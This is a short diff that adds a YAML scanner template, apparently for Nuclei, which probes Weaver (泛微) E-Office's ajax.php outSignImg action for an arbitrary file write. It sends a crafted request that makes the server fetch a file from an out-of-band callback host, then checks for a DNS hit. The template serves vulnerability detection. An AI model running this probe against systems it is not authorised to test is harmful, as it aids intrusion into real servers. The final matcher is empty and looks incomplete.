@@ -1,0 +1,25 @@
+id: poc-yaml-emobile-ajax-outsignImg-upload
+info:
+  name: 泛微E-Office ajax.php action=outSignImg 任意文件写入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-write,dnslog
+http:
+  - raw:
+      - |
+        GET /E-mobile/App/Ajax/ajax.php?action=outSignImg&result[]=http://{{interactsh-url}}/1.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: body
+        regex:
+          - "outImgs\\/(\\d+)\\/1.txt"
+      - type: word
+        part: body
+        words:
+          - ""
